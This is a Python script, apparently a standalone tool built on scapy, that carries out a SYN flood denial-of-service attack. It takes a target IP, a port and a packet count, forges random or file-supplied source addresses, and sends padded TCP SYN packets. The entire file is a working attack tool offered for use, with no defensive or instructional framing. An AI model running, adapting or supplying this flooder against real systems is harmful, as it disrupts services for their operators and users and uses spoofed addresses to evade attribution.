#!/usr/bin/python3
from os import system
from sys import stdout
from scapy import *
from scapy.all import *
from random import randint

import argparse

def randomIP():
    ip_src = ".".join(map(str, (randint(0,255)for _ in range(4))))

    #list(map(str,(randint(0,255)for _ in range(4)))) 
    #print(ip_src)
    return ip_src

def randomPort():
    port_src = randint(1000,65535)
    return port_src

def read_ip(file):
    ip_lists = []
    try:
        with open(file, 'r') as f:
            for line in f:
                ip = line.strip()
                ip_lists.append(ip)
        return ip_lists

    except FileNotFoundError:
        print(f"File {file} not found.")
        sys.exit(1) #End process

def syn_flood_attack(ip_dst, port_dst, counter, ip_src_file):
    if ip_src_file is None:
        ip_src_list = [randomIP() for _ in range(0,counter)]
    else: 
        ip_src_list = read_ip(ip_src_file)

    total = 0
    print("Packets are sending ... ")
   
    payload_size = 1024
    payload = Raw(load='A' * payload_size)

    for i in range(0,counter):
        IP_Packet = IP()
        IP_Packet.src = random.choice(ip_src_list)
        IP_Packet.dst = ip_dst

        TCP_Packet = TCP()
        TCP_Packet.sport = randomPort()
        TCP_Packet.dport = port_dst
        TCP_Packet.flags = "S" #syn flag
        TCP_Packet.seq = randint(1000,9000)
        TCP_Packet.window = randint(1000,9000)

        #raw = Raw("hi")
        send(IP_Packet/TCP_Packet/payload,verbose=0)
        total += 1
        
        print("src ip = " + IP_Packet.src + ", src port = " + str(TCP_Packet.sport))
    print("Total packets sent: %d\n" %(total) )

def main():
    parser = argparse.ArgumentParser(description = "SYN Flood")
    parser.add_argument('-ti', '--target_ip', help='Specify the target IP or Domain. e.g. 127.0.0.1', required=True)
    parser.add_argument('-tp', '--target_port', help="Specify the targrt's port", required=True)
    parser.add_argument('-c', '--count', help="Specify the number of packets that you want to send", required=True)
    parser.add_argument('-si', '--source_ip', help="Specify source ip by input {file_name}, e.g. src_ip.txt", required=False)

    arg = parser.parse_args()

    ip_dst = arg.target_ip
    port_dst = int(arg.target_port)
    counter = int(arg.count)

    #if (arg.source_ip is None):
    #    syn_flood_attack(ip_dst, port_dst, counter, )
    #else:
    syn_flood_attack(ip_dst, port_dst, counter, arg.source_ip)

if __name__ == '__main__':
    main()
